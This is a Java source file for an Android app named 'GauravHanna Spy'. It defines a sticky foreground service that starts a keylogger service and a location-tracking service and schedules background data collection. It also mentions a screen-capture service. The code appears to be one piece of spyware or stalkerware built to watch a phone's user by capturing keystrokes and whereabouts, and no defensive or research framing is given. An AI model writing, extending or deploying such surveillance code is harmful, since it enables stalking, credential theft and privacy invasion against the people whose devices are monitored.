package com.gauravhanna.spy;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

public class BackgroundService extends Service {
    private static final String CHANNEL_ID = "gauravhanna_spy_channel";
    private static final int NOTIFICATION_ID = 123;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, getNotification());

        // Start data collectors
        startService(new Intent(this, LocationService.class));
        startService(new Intent(this, KeyloggerService.class));
        // Start MediaProjectionService if needed (requires user consent)
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
                    "GauravHanna Spy Service",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("GauravHanna Spy")
                .setContentText("Monitoring active")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Start data collection tasks (could use WorkManager)
        DataCollector.scheduleDataCollection(this);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}